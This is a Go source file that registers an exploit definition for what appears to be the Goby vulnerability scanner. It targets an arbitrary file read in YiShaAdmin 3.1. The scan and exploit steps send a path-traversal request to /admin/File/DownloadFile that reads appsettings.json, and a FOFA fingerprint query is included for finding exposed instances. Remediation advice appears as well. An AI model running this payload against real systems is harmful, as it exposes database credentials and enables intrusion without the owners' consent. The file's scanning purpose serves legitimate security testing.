package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "YiShaAdmin 3.1 DownloadFile Api filePath params Arbitrary File Read Vulnerability",
    "Description": "<p>YiShaAdmin is based on the .NET Core MVC permission management system. The code is easy to read and understand, and the interface is simple and beautiful.</p><p>Attackers can exploit the vulnerability to read arbitrary files, including database passwords. </p>",
    "Impact": "<p>Attackers can exploit the vulnerability to read arbitrary files, including database passwords. </p>",
    "Recommendation": "<p>Set authentication to /admin/File/DownloadFile</p><p>Set a whitelist for access</p><p>Please follow the link for repair: <a href=\"https://github.com/liukuo362573/YiShaAdmin\">https://github.com/liukuo362573/YiShaAdmin</a></p>",
    "Product": "YiShaAdmin",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "YiShaAdmin 管理系统 3.1 DownloadFile 接口 filePath 参数任意文件读取漏洞",
            "Product": "YiShaAdmin",
            "Description": "<p>YiShaAdmin 基于 .NET Core MVC 的权限管理系统，代码易读易懂、界面简洁美观。</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可利用漏洞读取任意文件，包括数据库密码等。</span><br><br></p>",
            "Recommendation": "<p>1、对/admin/File/DownloadFile 设置鉴权</p><p>2、设置访问的白名单</p><p>3、修复请关注链接：<a href=\"https://github.com/liukuo362573/YiShaAdmin\">https://github.com/liukuo362573/YiShaAdmin</a><br></p>",
            "Impact": "<p>攻击者可利用漏洞读取任意文件，包括数据库密码等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "YiShaAdmin 3.1 DownloadFile Api filePath params Arbitrary File Read Vulnerability",
            "Product": "YiShaAdmin",
            "Description": "<p>YiShaAdmin is based on the .NET Core MVC permission management system. The code is easy to read and understand, and the interface is simple and beautiful.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Attackers can exploit the vulnerability to read arbitrary files, including database passwords.&nbsp;</span><br></p>",
            "Recommendation": "<p>Set authentication to /admin/File/DownloadFile</p><p><span style=\"color: var(--primaryFont-color);\">Set a whitelist for access</span></p><p>Please follow the link for repair: <a href=\"https://github.com/liukuo362573/YiShaAdmin\">https://github.com/liukuo362573/YiShaAdmin</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Attackers can exploit the vulnerability to read arbitrary files, including database passwords.&nbsp;</span><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"/yisha/css/login.css\"",
    "GobyQuery": "body=\"/yisha/css/login.css\"",
    "Author": "abszse",
    "Homepage": "https://github.com/liukuo362573/YiShaAdmin",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/File/DownloadFile?filePath=wwwroot/../appsettings.json&delete=0",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Logging",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/File/DownloadFile?filePath=wwwroot/../appsettings.json&delete=0",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Logging",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "appsettings.json",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10266"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
